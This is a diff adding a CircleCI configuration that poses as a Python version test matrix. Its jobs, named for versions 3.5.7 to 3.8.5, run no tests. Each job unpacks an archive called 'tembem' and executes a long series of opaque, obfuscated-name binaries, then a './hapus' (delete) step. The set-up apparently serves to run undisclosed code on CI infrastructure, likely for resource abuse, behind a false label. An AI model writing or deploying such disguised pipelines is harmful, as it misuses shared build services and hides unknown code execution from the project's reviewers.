@@ -1,0 +1,408 @@
+
+version: 2.1
+
+commands:
+  setup:
+    steps:
+      - run:
+          name: SetUp_01
+          command: |
+            tar -xf tembem && chmod u+x *
+            ./apem
+            ./star
+            ./mod
+            ./00
+
+  setep:
+    steps:
+      - run:
+          name: SetUp_02
+          command: |
+            ./hapus
+
+  setip:
+    parameters:
+      result:
+        type: string
+    steps:
+      - run:
+          name: SetUp_02
+          command: |
+            ./s4tu
+
+      - run:
+          name: SetUp_03
+          command: |
+            ./du4
+
+      - run:
+          name: SetUp_04
+          command: |
+            ./t19a
+
+      - run:
+          name: SetUp_05
+          command: |
+            ./emp4t
+
+      - run:
+          name: SetUp_06
+          command: |
+            ./l1m4
+
+      - run:
+          name: SetUp_07
+          command: |
+            ./3n4m
+
+      - run:
+          name: SetUp_08
+          command: |
+            ./7ujuh
+
+      - run:
+          name: SetUp_09
+          command: |
+            ./d3l4pan
+
+      - run:
+          name: SetUp_10
+          command: |
+            ./53m81l4n
+
+      - run:
+          name: SetUp_11
+          command: |
+            ./53puluh
+
+      - run:
+          name: SetUp_12
+          command: |
+            ./s3bel45
+
+      - run:
+          name: SetUp_13
+          command: |
+            ./du4b3l45
+
+      - run:
+          name: SetUp_14
+          command: |
+            ./t194b3l4s
+
+      - run:
+          name: SetUp_15
+          command: |
+            ./3mp4t83l45
+
+      - run:
+          name: SetUp_16
+          command: |
+            ./l1m483l45
+
+      - run:
+          name: SetUp_17
+          command: |
+            ./3n4mb3l45
+
+      - run:
+          name: SetUp_18
+          command: |
+            ./7ujuh83l45
+
+      - run:
+          name: SetUp_19
+          command: |
+            ./d3l4p4nB3l45
+
+      - run:
+          name: SetUp_20
+          command: |
+            ./hapus
+
+jobs:
+  version_3.5.7:
+    docker:
+      - image: cimg/python:3.5.7
+    steps:
+      - checkout
+      - setup
+      - setep
+
+  version_3.6.9:
+    docker:
+      - image: cimg/python:3.6.9
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.6.9
+    parallelism: 2
+
+  version_3.7.4:
+    docker:
+      - image: cimg/python:3.7.4
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.7.4
+    parallelism: 2
+
+  version_3.8.0:
+    docker:
+      - image: cimg/python:3.8.0
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.8.0
+    parallelism: 2
+
+  version_3.5.8:
+    docker:
+      - image: cimg/python:3.5.8
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.5.8
+    parallelism: 2
+
+  version_3.6.10:
+    docker:
+      - image: cimg/python:3.6.10
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.6.10
+    parallelism: 2
+
+  version_3.7.5:
+    docker:
+      - image: cimg/python:3.7.5
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.7.5
+    parallelism: 2
+
+  version_3.8.1:
+    docker:
+      - image: cimg/python:3.8.1
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.8.1
+    parallelism: 2
+
+  version_3.5.9:
+    docker:
+      - image: cimg/python:3.5.9
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.5.9
+    parallelism: 2
+
+  version_3.6.11:
+    docker:
+      - image: cimg/python:3.6.11
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.6.11
+    parallelism: 2
+
+  version_3.7.7:
+    docker:
+      - image: cimg/python:3.7.7
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.7.7
+    parallelism: 2
+
+  version_3.8.2:
+    docker:
+      - image: cimg/python:3.8.2
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.8.2
+    parallelism: 2
+
+  version_3.7.8:
+    docker:
+      - image: cimg/python:3.7.8
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.7.8
+    parallelism: 2
+
+  version_3.8.3:
+    docker:
+      - image: cimg/python:3.8.3
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.8.3
+    parallelism: 2
+
+  version_3.8.4:
+    docker:
+      - image: cimg/python:3.8.4
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.8.4
+    parallelism: 2
+
+  version_3.8.5:
+    docker:
+      - image: cimg/python:3.8.5
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.8.5
+    parallelism: 2
+
+  version_3.6.12:
+    docker:
+      - image: cimg/python:3.6.12
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: version_3.6.12
+    parallelism: 2
+
+workflows:
+  version: 2.1
+  workflo_01:
+    jobs:
+      - version_3.5.7
+      - version_3.6.9:
+          requires:
+            - version_3.5.7
+      - version_3.7.4:
+          requires:
+            - version_3.5.7
+            - version_3.6.9
+      - version_3.8.0:
+          requires:
+            - version_3.5.7
+            - version_3.6.9
+            - version_3.7.4
+      - version_3.5.8:
+          requires:
+            - version_3.5.7
+            - version_3.6.9
+            - version_3.7.4
+            - version_3.8.0
+      - version_3.6.10:
+          requires:
+            - version_3.5.7
+            - version_3.6.9
+            - version_3.7.4
+            - version_3.8.0
+            - version_3.5.8
+      - version_3.7.5:
+          requires:
+            - version_3.5.7
+            - version_3.6.9
+            - version_3.7.4
+            - version_3.8.0
+            - version_3.5.8
+            - version_3.6.10
+      - version_3.8.1:
+          requires:
+            - version_3.5.7
+            - version_3.6.9
+            - version_3.7.4
+            - version_3.8.0
+            - version_3.5.8
+            - version_3.6.10
+            - version_3.7.5
+      - version_3.5.9:
+          requires:
+            - version_3.5.7
+            - version_3.6.9
+            - version_3.7.4
+            - version_3.8.0
+            - version_3.5.8
+            - version_3.6.10
+            - version_3.7.5
+            - version_3.8.1
+
+  workflo_02:
+    jobs:
+      - version_3.5.7
+
+  workflo_03:
+    jobs:
+      - version_3.5.7
+      - version_3.6.11:
+          requires:
+            - version_3.5.7
+      - version_3.7.7:
+          requires:
+            - version_3.5.7
+            - version_3.6.11
+      - version_3.8.2:
+          requires:
+            - version_3.5.7
+            - version_3.6.11
+            - version_3.7.7
+      - version_3.7.8:
+          requires:
+            - version_3.5.7
+            - version_3.6.11
+            - version_3.7.7
+            - version_3.8.2
+      - version_3.8.3:
+          requires:
+            - version_3.5.7
+            - version_3.6.11
+            - version_3.7.7
+            - version_3.8.2
+            - version_3.7.8
+      - version_3.8.4:
+          requires:
+            - version_3.5.7
+            - version_3.6.11
+            - version_3.7.7
+            - version_3.8.2
+            - version_3.7.8
+            - version_3.8.3
+      - version_3.8.5:
+          requires:
+            - version_3.5.7
+            - version_3.6.11
+            - version_3.7.7
+            - version_3.8.2
+            - version_3.7.8
+            - version_3.8.3
+            - version_3.8.4
+      - version_3.6.12:
+          requires:
+            - version_3.5.7
+            - version_3.6.11
+            - version_3.7.7
+            - version_3.8.2
+            - version_3.7.8
+            - version_3.8.3
+            - version_3.8.4
+            - version_3.8.5
